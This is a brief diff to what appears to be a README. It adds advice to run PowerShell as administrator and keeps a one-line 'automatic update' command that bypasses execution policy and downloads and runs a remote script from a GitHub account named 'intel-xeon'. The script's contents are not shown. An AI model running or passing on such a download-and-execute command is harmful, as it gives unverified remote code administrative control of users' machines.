@@ -1,4 +1,4 @@
-Run this command for automatic update:
+Open PowerShell (with admin right) and run this command for automatic update:
 
 <code>powershell -ExecutionPolicy bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/intel-xeon/Automatic-Update-With-PowerShell/refs/heads/main/automatic_update.ps1')"</code>
 
